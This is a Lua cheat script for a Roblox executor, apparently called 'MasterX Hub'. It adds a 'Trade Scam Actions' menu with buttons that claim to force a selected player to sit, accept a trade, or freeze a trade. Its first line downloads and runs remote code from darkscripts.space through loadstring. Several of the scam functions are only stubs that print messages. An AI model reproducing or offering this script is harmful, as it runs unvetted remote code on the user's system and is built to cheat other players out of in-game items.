-- Load MasterX Hub
local OrionLib = loadstring(game:HttpGet('https://darkscripts.space/scripts/e316f50c-bf20-40b3-a860-e0250d326384_906768167844581416.lua', true))()

-- Create Window
local Window = OrionLib:MakeWindow({Name = "MasterX Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "MasterXHub"})

-- Variables
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local selectedPlayer = nil

-- Function: Force Sit
local function ForceSit(targetPlayer)
    if targetPlayer and targetPlayer.Character then
        targetPlayer.Character.Humanoid.Sit = true
    end
end

-- Function: Force Accept Trade
local function ForceAcceptTrade(targetPlayer)
    -- Simulated action for forcing trade acceptance
    print(targetPlayer.Name .. " was forced to accept the trade!")
    -- Add your custom logic for trade acceptance simulation
end

-- Function: Freeze Trade
local function FreezeTrade(targetPlayer)
    if targetPlayer and targetPlayer.Character then
        targetPlayer.Character.HumanoidRootPart.Anchored = true
        print(targetPlayer.Name .. " is frozen in the trade!")
        -- Add custom logic for freezing the trade
    end
end

-- UI Buttons
local Tab = Window:MakeTab({
    Name = "Trade Scam Actions",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

Tab:AddDropdown({
    Name = "Select Target Player",
    Default = "",
    Options = {},
    Callback = function(value)
        selectedPlayer = Players:FindFirstChild(value)
    end
})

Tab:AddButton({
    Name = "Force to Sit",
    Callback = function()
        if selectedPlayer then
            ForceSit(selectedPlayer)
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "No player selected!",
                Time = 3
            })
        end
    end
})

Tab:AddButton({
    Name = "Force to Accept",
    Callback = function()
        if selectedPlayer then
            ForceAcceptTrade(selectedPlayer)
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "No player selected!",
                Time = 3
            })
        end
    end
})

Tab:AddButton({
    Name = "Freeze Trade",
    Callback = function()
        if selectedPlayer then
            FreezeTrade(selectedPlayer)
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "No player selected!",
                Time = 3
            })
        end
    end
})

-- Initialize GUI
OrionLib:Init()
